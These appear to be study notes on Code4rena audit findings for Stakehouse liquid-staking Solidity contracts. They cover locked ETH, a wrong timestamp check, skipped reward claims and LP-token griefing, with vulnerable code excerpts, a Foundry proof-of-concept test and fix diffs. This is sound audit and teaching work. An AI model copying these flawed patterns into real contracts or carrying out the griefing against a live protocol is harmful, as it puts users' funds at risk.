Calling the `executeAsSmartWallet` function by the DAO further calls the `OwnableSmartWallet.execute` function. Since the `executeAsSmartWallet` function is `payable`, an ETH amount can be sent when calling it. However, since the sent ETH amount is not forwarded to the smart wallet contract, such sent amount can become locked in the `LiquidStakingManager` contract. For example, when the DAO attempts to call the `executeAsSmartWallet` function for sending some ETH to the smart wallet so the smart wallet can use it when calling its `execute` function, if the smart wallet's ETH balance is also higher than this sent ETH amount, calling the `executeAsSmartWallet` function would not revert, and the sent ETH amount is locked in the `LiquidStakingManager` contract while such amount is deducted from the smart wallet's ETH balance for being sent to the target address. Besides that this is against the intention of the DAO, the DAO loses the sent ETH amount that becomes locked in the `LiquidStakingManager` contract, and the node runner loses the amount that is unexpectedly deducted from the corresponding smart wallet's ETH balance.

[LiquidStakingManager.sol#L202-L215](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215)
```solidity
    function executeAsSmartWallet(
        address _nodeRunner,
        address _to,
        bytes calldata _data,
        uint256 _value
    ) external payable onlyDAO {
        address smartWallet = smartWalletOfNodeRunner[_nodeRunner];
        require(smartWallet != address(0), "No wallet found");
        IOwnableSmartWallet(smartWallet).execute(
            _to,
            _data,
            _value
        );
    }
```

[OwnableSmartWallet.sol#L52-L64](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64)
```solidity
    function execute(
        address target,
        bytes memory callData,
        uint256 value
    )
        external
        override
        payable
        onlyOwner // F: [OSW-6A]
        returns (bytes memory)
    {
        return target.functionCallWithValue(callData, value); // F: [OSW-6]
    }
```

### Proof of Concept

Please add the following code in `test\foundry\LSDNFactory.t.sol`.

1. Add the following `receive` function for the POC purpose.
```solidity
    receive() external payable {}
```

2. Add the following test. This test will pass to demonstrate the described scenario.
```solidity
    function testETHSentWhenCallingExecuteAsSmartWalletFunctionCanBeLost() public {
        vm.prank(address(factory));
        manager.updateDAOAddress(admin);
        uint256 nodeStakeAmount = 4 ether;
        address nodeRunner = accountOne;
        vm.deal(nodeRunner, nodeStakeAmount);
        address eoaRepresentative = accountTwo;
        vm.prank(nodeRunner);
        manager.registerBLSPublicKeys{value: nodeStakeAmount}(
            getBytesArrayFromBytes(blsPubKeyOne),
            getBytesArrayFromBytes(blsPubKeyOne),
            eoaRepresentative
        );
        // Before the executeAsSmartWallet function is called, the manager contract owns 0 ETH,
        //   and nodeRunner's smart wallet owns 4 ETH. 
        assertEq(address(manager).balance, 0);
        assertEq(manager.smartWalletOfNodeRunner(nodeRunner).balance, 4 ether);
        uint256 amount = 1.5 ether;
        vm.deal(admin, amount);
        vm.startPrank(admin);
        // admin, who is dao at this moment, calls the executeAsSmartWallet function while sending 1.5 ETH
        manager.executeAsSmartWallet{value: amount}(nodeRunner, address(this), bytes(""), amount);
        vm.stopPrank();
        // Although admin attempts to send the 1.5 ETH through calling the executeAsSmartWallet function,
        //   the sent 1.5 ETH was not transferred to nodeRunner's smart wallet but is locked in the manager contract instead.
        assertEq(address(manager).balance, amount);
        // Because nodeRunner's smart wallet owns more than 1.5 ETH, 1.5 ETH of this smart wallet's ETH balance is actually sent to address(this).
        assertEq(manager.smartWalletOfNodeRunner(nodeRunner).balance, 4 ether - amount);
    }
```
### Recommended Mitigation

[LiquidStakingManager.sol#L210-L214](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L210-L214)
```solidity
        IOwnableSmartWallet(smartWallet).execute(
            _to,
            _data,
            _value
        );
```

can be updated to the following code.
```solidity
        IOwnableSmartWallet(smartWallet).execute{value: msg.value}(
            _to,
            _data,
            _value
        );
```
### Discussion

### Notes & Impressions

#### Notes 


#### Impressions
In Ethereum and Solidity, when you call a function with ETH (using `{value: amount}`), that ETH is transferred directly to the contract being called. However, that ETH doesn't automatically "flow through" to any subsequent contract calls unless you explicitly forward it.

### Tools
### Refine

- [[1-Business_Logic]]

---
## [M-25] Incorrect checking in `_assertUserHasEnoughGiantLPToClaimVaultLP`
----
- **Tags**: #business_logic 
- Number of finders: 2
- Difficulty: Hard
---
### Lines of code

[GiantPoolBase.sol#L93-L97](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L93-L97)
```solidity
    function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {
        require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");
        require(_token.balanceOf(address(this)) >= _amount, "Pool does not own specified LP");
        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new");
    }
```
### Impact

The batch operations of `withdrawDETH()` in `GiantSavETHVaultPool.sol` and `withdrawLPTokens()` in `GiantPoolBase.sol` are meaningless because they will fail whenever more than one `lpToken` is passed.  
Each user can perform `withdrawDETH()` or `withdrawLPTokens()` with one `LPToken` only once a day.
### Proof of Concept

Both the `withdrawDETH()` in `GiantSavETHVaultPool.sol` and `withdrawLPTokens()` in GiantPoolBase.sol will call `GiantPoolBase._assertUserHasEnoughGiantLPToClaimVaultLP(lpToken, amount)` and `lpTokenETH.burn(msg.sender, amount)`:

There is a require in `_assertUserHasEnoughGiantLPToClaimVaultLP()`:

```solidity
require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new");
```

At the same time, `lpTokenETH.burn(msg.sender, amount)` will update `lastInteractedTimestamp[msg.sender]` to latest block timestamp in `_afterTokenTransfer()` of `GiantLP.sol`.

So, a user can perform `withdrawDETH` or `withdrawLPTokens` of one LPToken only once a day, others more will fail by `_assertUserHasEnoughGiantLPToClaimVaultLP()`.
### Recommended Mitigation

The LPToken being operated on should be checked for lastInteractedTimestamp rather than lpTokenETH.

```solidity
diff --git a/contracts/liquid-staking/GiantPoolBase.sol b/contracts/liquid-staking/GiantPoolBase.sol
index 8a8ff70..5c009d9 100644
--- a/contracts/liquid-staking/GiantPoolBase.sol
+++ b/contracts/liquid-staking/GiantPoolBase.sol
@@ -93,7 +93,7 @@ contract GiantPoolBase is ReentrancyGuard {
     function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {
         require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");
         require(_token.balanceOf(address(this)) >= _amount, "Pool does not own specified LP");
-        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new");
+        require(_token.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new");
     }

     /// @dev Allow an inheriting contract to have a hook for performing operations post depositing ETH
```

### Discussion

### Notes & Impressions

#### Notes 

- programming error
- When validating state conditions for specific token operations, always ensure that the state being checked corresponds directly to the specific token being operated on, not a global or unrelated token.

### Tools
### Refine

- [[1-Business_Logic]]

---
## [M-28] Funds are not claimed from syndicate for valid BLS keys of first key is invalid (no longer part of syndicate).
----
- **Tags**: #business_logic #validation #single_point_of_failure
- Number of finders: 1
- Difficulty: Hard
---
### Detail

claimRewards in StakingFundsVault.sol has this code:

```solidity
if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {
    // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract
    // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched
    _claimFundsFromSyndicateForDistribution(
        liquidStakingNetworkManager.syndicate(),
        _blsPubKeys
    );
    // Distribute ETH per LP
    updateAccumulatedETHPerLP();
}
```

The issue is that if the first BLS public key is not part of the syndicate, then `_claimFundsFromSyndicateForDistribution` will not be called, even on BLS keys that are eligible for syndicate rewards. This leads to reduced rewards for user.

This is different from a second bug which discusses the possibility of using a stale `acculmulatedETHPerLP`.
### Impact

Users will not receive rewards for claims of valid public keys if first passed key is not part of syndicate.
### Recommended Mitigation

Drop the `i==0` requirement, which was intended to make sure the claim isn't called multiple times. Use a hasClaimed boolean instead.

### Discussion

### Notes & Impressions

#### Notes 
The developer used a position-based check (`i == 0`) to identify the first iteration of the loop. This approach seems logical at first glance - "We'll do this special operation only during the first pass through the loop."

```
if (i == 0 && !Syndicate(...).isNoLongerPartOfSyndicate(_blsPubKeys[i]))
```

means:

- Only do this if we're on the first key AND
- Only do this if that first key is still valid in the syndicate

The developer didn't fully consider what would happen when the first key fails validation. In that scenario, the claiming operation doesn't just skip that one key - it skips ALL keys, even perfectly valid ones later in the array.

#### Impressions
##### The Single Point of Failure Anti-Pattern

This issue exemplifies a broader principle in smart contract design: **avoid making the execution of critical business logic dependent on a single validation check that isn't directly related to that logic**.

### Tools

- [[[Single_Point_of_Failure]]
### Refine

- [[1-Business_Logic]]
- [[2-Validation]]

---
## [M-30] Giant pools are prone to user griefing, preventing their holdings from being staked
----
- **Tags**: #business_logic #admin
- Number of finders: 1
- Difficulty: Hard
---
### Detail

`batchRotateLPTokens` in `GiantMevAndFeesPool` allows any user to rotate LP tokens of `stakingFundsVaults` around.

```solidity
function batchRotateLPTokens(
    address[] calldata _stakingFundsVaults,
    LPToken[][] calldata _oldLPTokens,
    LPToken[][] calldata _newLPTokens,
    uint256[][] calldata _amounts
) external {
    uint256 numOfRotations = _stakingFundsVaults.length;
    require(numOfRotations > 0, "Empty arrays");
    require(numOfRotations == _oldLPTokens.length, "Inconsistent arrays");
    require(numOfRotations == _newLPTokens.length, "Inconsistent arrays");
    require(numOfRotations == _amounts.length, "Inconsistent arrays");
    require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, "No common interest");
    for (uint256 i; i < numOfRotations; ++i) {
        StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);
    }
}
```

There is a check that sender has over 0.5 ether of `lpTokenETH`, to prevent griefing. However, this check is unsatisfactory as user can at any stage deposit ETH to receive `lpTokenETH` and burn it to receive back ETH. Their `lpTokenETH` holdings do not correlate with their interest in the vault funds.

Therefore, malicious users can keep bouncing LP tokens around and prevent them from being available for actual staking by liquid staking manager.
### Impact

Giant pools are prone to user griefing, preventing their holdings from being staked.
### Recommended Mitigation

Three options:

1. `batchRotateLPTokens` should have logic to enforce that this specific rotation is logical
2. only DAO or some priviledged user can perform Giant pool operations
3. Make the caller have something to lose from behaving maliciously, unlike the current status.

### Discussion

This doesn't factor in that when ETH is supplied to a liquid staking network, it has 30 minutes to be utilized for staking with the BLS public key - giant pool users can manage this inventory and move the liquidity between BLS keys but that's by design and as mentioned above cannot move for 30 minutes at a time. If it never gets used, it can always go back to the giant pool
### Notes & Impressions

#### Notes 
- A user can temporarily acquire the required `lpTokenETH` by depositing ETH, perform the disruptive action, and then immediately withdraw their ETH by burning the LP tokens.
- This means the user doesn't actually have to maintain any long-term stake in the system to perform potentially harmful operations.
- As a result, malicious actors can repeatedly "bounce" LP tokens between vaults, preventing them from being properly staked by the intended staking manager.

#### Impressions

Access controls based on temporary or easily acquirable tokens don't provide effective protection against malicious behavior when there's no permanent cost or risk to the attacker.

### Tools
### Refine

- [[1-Business_Logic]]
- [[27-Admin]]

---
## Audit Summary Notes
- {{summary_notes}}

## Tags
- Category: {{tags_category}}
- Priority:{{tags_priority}}